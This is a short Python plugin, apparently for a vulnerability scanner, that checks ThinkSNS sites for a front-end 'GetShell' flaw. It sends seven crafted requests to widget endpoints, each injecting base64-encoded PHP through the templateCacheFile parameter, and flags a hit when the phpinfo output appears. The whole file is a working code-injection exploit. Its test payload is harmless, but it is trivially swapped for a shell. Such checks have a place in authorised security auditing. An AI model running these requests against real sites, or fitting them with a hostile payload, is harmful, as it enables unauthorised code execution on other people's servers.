#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:range
#refer:http://www.wooyun.org/bugs/wooyun-2010-081755

def assign(service, arg):
    if service == "thinksns":
        return True, arg

def audit(arg):
    payload_list = ['/index.php?app=widget&mod=Denouce&act=index&aid=1&fuid=1&type=ztz&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D','/index.php?app=widget&mod=Comment&act=addcomment&uid=1&app_name=public&table_name=user&content=test&row_id=1&app_detail_summary=1&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D','/index.php?app=widget&mod=Department&act=change&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D','/index.php?app=widget&mod=Diy&act=addWidget&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D','/index.php?app=widget&mod=FeedList&act=loadMore&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D','/index.php?app=widget&mod=FeedList&act=loadNew&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D&maxId=1','/index.php?app=widget&mod=Remark&act=edit&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D']
    for payload in payload_list:
        url = arg + payload
        code, head, res, errcode, _ = curl.curl(url)
        if code == '200':
            if res.find('System') != -1:
                security_hole(url + 'ThinkSNS前台GetShell ')

if __name__ == '__main__':
    from dummy import *
    audit(assign('thinksns', 'http://www.example.com/')[1])